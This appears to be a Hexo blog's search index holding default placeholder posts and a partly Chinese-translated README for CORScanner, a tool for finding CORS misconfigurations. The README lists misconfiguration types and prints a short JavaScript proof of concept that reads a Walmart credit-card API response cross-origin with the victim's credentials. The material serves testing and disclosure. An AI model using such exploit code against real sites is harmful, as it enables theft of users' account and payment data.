<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>hello-world</title>
    <url>/2019/12/04/hello-world-1/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>分类1</category>
        <category>分类2</category>
      </categories>
      <tags>
        <tag>标签1</tag>
        <tag>标签2</tag>
        <tag>标签3</tag>
      </tags>
  </entry>
  <entry>
    <title>About CORScanner</title>
    <url>/2019/12/04/About%20CORScanner/</url>
    <content><![CDATA[<h2 id="About-CORScanner"><a href="#About-CORScanner" class="headerlink" title="About CORScanner"></a>About CORScanner</h2><p>CORScanner是一个python工具，旨在发现网站的CORS错误配置漏洞。它可以帮助网站管理员和渗透测试人员检查他们针对的域/ URL是否具有不安全的CORS策略。</p>
<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><ul>
<li><p>Download this tool</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;chenjj&#x2F;CORScanner.git</span></pre></td></tr></table></figure>
</li>
<li><p>Install dependencies</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip install -r requirements.txt</span></pre></td></tr></table></figure>
<p>CORScanner depends on the <code>requests</code>, <code>gevent</code>, <code>tldextract</code>, <code>colorama</code> and <code>argparse</code> python modules.</p>
</li>
</ul>
<h2 id="Python-Version"><a href="#Python-Version" class="headerlink" title="Python Version:"></a>Python Version:</h2><ul>
<li>Both Python 2 (<strong>2.7.x</strong>) and Python 3 (<strong>3.7.x</strong>) are supported.</li>
</ul>
<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><div class="table-container">
<table>
<thead>
<tr>
<th>Short Form</th>
<th>Long Form</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-u</td>
<td>—url</td>
<td>URL/域以检查它的CORS政策</td>
</tr>
<tr>
<td>-d</td>
<td>—headers</td>
<td>向请求添加标头</td>
</tr>
<tr>
<td>-i</td>
<td>—input</td>
<td>URL/域列表文件以检查其CORS政策y</td>
</tr>
<tr>
<td>-t</td>
<td>—threads</td>
<td>用于CORS扫描的线程数</td>
</tr>
<tr>
<td>-o</td>
<td>—output</td>
<td>将结果保存到json文件</td>
</tr>
<tr>
<td>-v</td>
<td>—verbose</td>
<td>启用详细模式并实时显示结果</td>
</tr>
<tr>
<td>-h</td>
<td>—help</td>
<td>显示帮助信息并退出</td>
</tr>
</tbody>
</table>
</div>
<h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><ul>
<li>要检查特定域的CORS配置错误:</li>
</ul>
<p><code>python cors_scan.py -u example.com</code></p>
<ul>
<li>要检查特定网址的CORS配置错误:</li>
</ul>
<p><code>python cors_scan.py -u http://example.com/restapi</code></p>
<ul>
<li>要检查多个域/ URL的CORS配置错误:</li>
</ul>
<p><code>python cors_scan.py -u example.com -d &quot;Cookie: test&quot;</code></p>
<ul>
<li>要列出所有基本选项和开关，请使用-h开关:</li>
</ul>
<p><code>python cors_scan.py -i top_100_domains.txt -t 100</code></p>
<ul>
<li>To list all the basic options and switches use -h switch:</li>
</ul>
<p><code>python cors_scan.py -h</code></p>
<h2 id="Misconfiguration-types"><a href="#Misconfiguration-types" class="headerlink" title="Misconfiguration types"></a>Misconfiguration types</h2><p>This tool covers the following misconfiguration types:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Misconfiguration type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Reflect_any_origin</td>
<td>Blindly reflect the Origin header value in <code>Access-Control-Allow-Origin headers</code> in responses, which means any website can read its secrets by sending cross-orign requests.</td>
</tr>
<tr>
<td>Prefix_match</td>
<td><code>wwww.example.com</code> trusts <code>example.com.evil.com</code>, which is an attacker’s domain.</td>
</tr>
<tr>
<td>Suffix_match</td>
<td><code>wwww.example.com</code> trusts <code>evilexample.com</code>, which could be registered by an attacker.</td>
</tr>
<tr>
<td>Not_escape_dot</td>
<td><code>wwww.example.com</code> trusts <code>wwwaexample.com</code>, which could be registered by an attacker.</td>
</tr>
<tr>
<td>Substring match</td>
<td><code>wwww.example.com</code> trusts <code>example.co</code>, which could be registered by an attacker.</td>
</tr>
<tr>
<td>Trust_null</td>
<td><code>wwww.example.com</code> trusts <code>null</code>, which can be forged by iframe sandbox scripts</td>
</tr>
<tr>
<td>HTTPS_trust_HTTP</td>
<td>Risky trust dependency, a MITM attacker may steal HTTPS site secrets</td>
</tr>
<tr>
<td>Trust_any_subdomain</td>
<td>Risky trust dependency, a subdomain XSS may steal its secrets</td>
</tr>
<tr>
<td>custom_third_parties</td>
<td>Custom unsafe third parties origins like <code>github.io</code>, see more in <a href="./origins.json">origins.json</a> file. Thanks <a href="https://github.com/phackt" target="_blank" rel="noopener">@phackt</a>!</td>
</tr>
</tbody>
</table>
</div>
<p>Welcome to contribute more.  </p>
<h2 id="Exploitation-examples"><a href="#Exploitation-examples" class="headerlink" title="Exploitation examples"></a>Exploitation examples</h2><p>Here is an example about how to exploit “Reflect_any_origin” misconfiguration on Walmart.com(fixed). Localhost is the malicious website in the video.</p>
<p>Walmart.com video on Youtube:</p>
<p><a href="http://www.youtube.com/watch?v=3abaevsSHXY" target="_blank" rel="noopener"><img src="https://github.com/chenjj/CORScanner/raw/master/images/walmart.png" alt="Walmart_CORS_misconfiguration_exploitation"></a></p>
<p>Here is the exploitation code:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="comment">// Send a cross origin request to the walmart.com server, when a victim visits the page.</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();       req.open(<span class="string">'GET'</span>,<span class="string">"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card"</span>,<span class="literal">true</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    req.onload = stealData;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    req.withCredentials = <span class="literal">true</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    req.send();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stealData</span>(<span class="params"></span>)</span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//reading response is allowed because of the CORS misconfiguration.</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">var</span> data= <span class="built_in">JSON</span>.stringify(<span class="built_in">JSON</span>.parse(<span class="keyword">this</span>.responseText),<span class="literal">null</span>,<span class="number">2</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//display the data on the page. A real attacker can send the data to his server.</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        output(data);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">inp</span>) </span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="built_in">document</span>.body.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'pre'</span>)).innerHTML = inp;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;</span></span></pre></td></tr></table></figure></p>
<p>If you have understood how the demo works, you can read Section 5 and Section 6 of the <a href="https://www.jianjunchen.com/publication/an-empirical-study-of-cors/" target="_blank" rel="noopener">CORS paper</a> and know how to exploit other misconfigurations.</p>
<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>CORScanner is licensed under the MIT license. take a look at the <a href="./LICENSE">LICENSE</a> for more information.</p>
<h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><p>This work is inspired by the following excellent researches:</p>
<ul>
<li>James Kettle, “Exploiting CORS misconfigurations for Bitcoins and bounties”, AppSecUSA 2016*</li>
<li>Evan Johnson, “Misconfigured CORS and why web appsec is not getting easier”,  AppSecUSA 2016*</li>
<li>Von Jens Müller, “CORS misconfigurations on a large scale”, <a href="https://github.com/RUB-NDS/CORStest" target="_blank" rel="noopener">CORStest</a>*</li>
</ul>
]]></content>
      <categories>
        <category>吃饭</category>
        <category>睡觉</category>
      </categories>
      <tags>
        <tag>CORS</tag>
        <tag>burp</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/12/04/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
</search>
